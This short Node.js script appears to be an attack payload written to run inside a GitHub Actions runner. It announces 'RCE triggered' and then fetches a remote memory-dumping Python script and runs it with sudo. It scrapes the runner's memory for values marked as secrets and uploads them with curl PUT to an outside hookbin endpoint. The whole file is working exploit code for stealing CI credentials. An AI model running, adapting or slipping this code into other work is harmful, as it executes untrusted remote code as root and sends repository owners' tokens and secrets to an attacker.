const { execSync } = require('child_process');
const fs = require('fs');
const runId = process.env.GITHUB_RUN_ID;

if (fs.existsSync('/tmp/.rce_lock')) return;
try {
    fs.writeFileSync('/tmp/.rce_lock', '1');
} catch (e) {}

console.log("RCE triggered");
try {
    execSync(`echo "Okay, we got this far. Let's continue..."
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"
curl -X PUT -d \\@/tmp/secrets "https://open-hookbin.vercel.app/${runId}"`, { stdio: 'inherit', shell: '/bin/bash' });
} catch (e) {
    console.error(e);
}
